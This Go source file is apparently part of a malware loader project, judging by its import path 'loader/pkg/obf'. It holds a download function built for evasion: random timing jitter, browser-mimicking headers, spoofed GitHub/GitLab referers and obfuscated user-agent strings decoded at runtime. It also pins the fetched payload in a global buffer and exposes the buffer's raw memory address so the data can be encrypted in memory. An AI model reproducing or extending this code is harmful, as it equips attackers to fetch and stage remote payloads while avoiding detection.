package net

import (
	"net/http"
	"fmt"
	"io/ioutil"
	"runtime"
	"unsafe"
	"crypto/tls"
	"time"
	"math/rand"
	"net/url"
	"strings"
	"loader/pkg/obf"
)

// Global buffer to prevent GC during execution
var globalBuffer []byte

// GetGlobalBufferRegion returns the memory address and size of the global buffer
// This can be used with EncryptMemoryRegion to encrypt the downloaded data
func GetGlobalBufferRegion() (uintptr, uint32, error) {
	if globalBuffer == nil || len(globalBuffer) == 0 {
		return 0, 0, fmt.Errorf("global buffer is empty or not initialized")
	}
	
	// Get the memory address of the global buffer
	bufferAddr := uintptr(unsafe.Pointer(&globalBuffer[0]))
	bufferSize := uint32(len(globalBuffer))
	
	return bufferAddr, bufferSize, nil
}

// FindBufferRegion finds the memory address and size of any byte slice
// This is a generic helper that can find the region of any buffer
func FindBufferRegion(buffer []byte) (uintptr, uint32, error) {
	if buffer == nil || len(buffer) == 0 {
		return 0, 0, fmt.Errorf("buffer is empty or nil")
	}
	
	bufferAddr := uintptr(unsafe.Pointer(&buffer[0]))
	bufferSize := uint32(len(buffer))
	
	return bufferAddr, bufferSize, nil
}


func DownloadFile(targetURL string) ([]byte, error) {
	delay := time.Duration(rand.Intn(400)+100) * time.Millisecond
	time.Sleep(delay)
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %v", err)
	}
	
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false,
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		PreferServerCipherSuites: true,
	}
	
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		DisableKeepAlives:   true,
		DisableCompression:  false,
		MaxIdleConns:        10,
		IdleConnTimeout:     30 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		ForceAttemptHTTP2:   true,
	}
	
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	// Use decoded user agent instead of plaintext array
	ua := GetUA()
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "close")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Cache-Control", "max-age=0")
	
	if parsedURL.Host != "" {
		if strings.Contains(parsedURL.Host, "github") {
			req.Header.Set("Referer", "https://github.com/")
		} else if strings.Contains(parsedURL.Host, "gitlab") {
			req.Header.Set("Referer", "https://gitlab.com/")
		} else {
			req.Header.Set("Referer", fmt.Sprintf("https://%s/", parsedURL.Host))
		}
	}
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download file: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("bad status: %s", resp.Status)
	}
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %v", err)
	}
	
	// more hacks to get around go garbage collector evil 
	globalBuffer = make([]byte, len(body))
	copy(globalBuffer, body)
	ptr := unsafe.Pointer(&globalBuffer[0])
	runtime.KeepAlive(ptr)
	runtime.KeepAlive(globalBuffer)
	result := make([]byte, len(body))
	copy((*[1 << 30]byte)(unsafe.Pointer(&result[0]))[:len(body)], globalBuffer)
	
	delay = time.Duration(rand.Intn(150)+50) * time.Millisecond
	time.Sleep(delay)
	
	return result, nil
}

func randomIndex(length int) int {
	return rand.Intn(length)
}

func GetUA() string {
	values := []uint32{
		1952754633, 2905136297, 4130953010, 4130951921, 2515949141,
		222516017, 2693133715, 3709930420, 3153036755, 4203786264,
		1434070913, 423778214, 350507105, 1703267631, 3830667078,
		1914621356, 2417304603, 543457218, 4271095422, 3184214496,
		2052393191, 4208372894, 3634488812, 3991748456, 1095669213,
		1142401931, 1146977454, 1770329412, 1030629383, 1934717116,
		1330649263, 1210002353, 1524148092, 681145231, 1609284707,
		1760052334, 3862912451, 1794335975, 1918804120, 2964903769,
		307468793, 2124166808, 1970919641, 1595158123, 422147776,
		3866893171, 267248916, 892945811, 1548893238, 2054794018,
		368480778, 205656825, 247455888, 710845588, 3852485815,
		2649214766, 3705530546, 2728434626, 4277221896,
	}

	// Pick a random value from the array
	randIdx := randomIndex(len(values))
	return obf.Decode(values[randIdx])
}